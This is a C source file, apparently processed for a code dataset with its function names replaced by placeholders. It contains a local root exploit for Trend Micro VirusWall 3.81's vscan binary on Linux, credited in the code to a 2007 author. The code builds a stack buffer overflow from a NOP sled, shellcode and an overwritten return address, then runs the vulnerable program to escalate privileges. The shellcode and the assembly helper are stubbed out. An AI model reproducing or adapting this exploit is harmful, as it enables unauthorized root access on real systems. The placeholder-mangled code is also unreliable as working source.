#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  NOP ; 
 int FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 unsigned long FUNC3 () ; 
 int FUNC4 () ; 
 scalar_t__ FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int,int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  shellcode ; 
 char* FUNC9 (int /*<<< orphan*/ ) ; 
 char* vscan ; 

int FUNC10(int argc, char *argv[], char **envp) {

    // Size of the vulnerable buffer (1116 + 4 bytes to overwrite EIP)
    int buff = 1120;

    // Address of the shellcode
    unsigned long addr;

    // Temporarily used to add nops etc.
    char *ptr;

    FUNC8("\nLocal root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)\n");
    FUNC8("Author: Sebastian Wolfgarten, <sebastian@wolfgarten.com>\n");
    FUNC8("Date: January 3rd, 2007\n\n");

    // Check permissions on vscan executable, if this fails exploitation is infeasible.
    if (FUNC0(vscan, 01) != -1) {

        FUNC8("Okay, %s is executable and by the way, your current user id is %d.\n",vscan,FUNC4());

	// Allocate memory for filling the buffer
        if((ptr = (char *)FUNC5(buff)) == NULL) {

		FUNC8("Error allocating memory!\n");
		FUNC2(-1);

	}

	// Determine the address of the shellcode with the inline assembly above
        addr = FUNC3();

        // Add the NOP's to the buffer
        FUNC7(ptr, NOP, buff);

        // Add the shellcode
        FUNC6(ptr + buff - FUNC9(shellcode) - 8, shellcode, FUNC9(shellcode));

        // The return address
        *(long *)&ptr[buff - 4] = addr;

        // Off we go, execute the vulnerable program
        FUNC8("\nExecuting %s. Afterwards check your privilege level with id or whoami!\n",vscan);
        FUNC1(vscan, "vscan", ptr, NULL);

    } else {

        FUNC8("Exploit failed. You seem not to have enough privileges to execute %s, sorry.\n",vscan);
	FUNC8("Hint: Ask your local admin to add yourself to the iscan group or let him make the vscan binary world-executable.\n");
	FUNC8("Then try again :-)\n\n");
	FUNC2(1);

    }

    return 0;

}